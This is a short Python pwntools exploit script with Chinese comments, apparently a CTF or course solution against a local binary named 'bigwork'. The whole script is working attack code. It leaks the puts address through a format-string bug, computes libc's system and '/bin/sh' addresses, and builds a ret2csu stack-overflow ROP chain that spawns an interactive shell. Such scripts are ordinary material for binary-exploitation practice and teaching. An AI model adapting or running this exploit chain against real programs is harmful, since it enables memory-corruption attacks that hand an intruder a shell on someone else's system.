# coding: utf-8
# ret2csu
from pwn import *
# context.log_level = 'debug'

sh = process('../src/bigwork')
elf = ELF('../src/bigwork')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x401329
pop_rdi_ret = 0x0401453

# 泄露真实地址
sh.sendline('2'.encode())
sh.recv()
pyload = 'aaaa%7$s'.encode() + p64(puts_got) 
sh.sendline(pyload)
puts_real = u64(sh.recv()[10: 16] + '\x00\x00'.encode())  

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_real - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh'.encode()).__next__()

print(hex(system_addr))

func_addr = 0x401216

def ret_csu(r15, r14, r13, r12, last):
    payload =  "/bin/sh||aaaaaaa".encode()                    # 构造栈溢出的padding
    payload += p64(system_addr)
    payload += ('\x00' * 0x20).encode()
    payload += p64(0x401446)                    # gadgets1的地址
    payload +=  ('a' * 0x08).encode()           # 构造栈溢出的padding
    payload += p64(0) + p64(1)                  # rbx=0, rbp=1
    payload += p64(r12) + p64(r13) + p64(r14)   # 三个参数的寄存器,  r14 -> rdx, r13 -> rsi，r12d -> edi
    payload += p64(r15)                         # call调用的地址
    payload += p64(0x401430)                    # gadgets2的地址
    payload += ('a' * 0x30).encode()            # pop出的padding
    payload += p64(last)                        # 函数最后的返回地址
    return payload

func_addr_ptr = 0x403590
bin_sh_addr = 0x403580

sh.sendline('1'.encode())
sh.sendline(ret_csu(func_addr_ptr, 0, 0, bin_sh_addr, main_addr))

sh.interactive()